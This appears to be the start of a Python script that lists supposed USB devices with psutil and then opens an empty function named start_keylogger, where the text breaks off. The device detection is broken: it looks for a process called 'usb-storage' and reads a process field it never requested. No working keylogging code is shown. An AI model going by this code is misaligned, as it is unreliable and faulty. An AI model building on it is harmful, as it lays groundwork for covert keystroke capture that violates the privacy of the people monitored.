import psutil
import time
import os

def is_usb_device(device):
    return 'usb' in device

def get_usb_devices():
    devices = []
    for process in psutil.process_iter(['name']):
        if process.info['name'] == 'usb-storage':
            devices.append(process.info['exe'])
    return devices

def start_keylogger():
